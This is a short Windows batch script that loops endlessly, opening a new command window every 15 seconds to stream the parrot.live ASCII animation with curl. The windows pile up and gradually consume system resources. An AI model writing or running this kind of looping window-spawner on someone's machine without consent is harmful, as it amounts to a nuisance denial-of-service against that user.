@echo off
:loop
start cmd /k "curl parrot.live"
timeout /t 15
goto loop
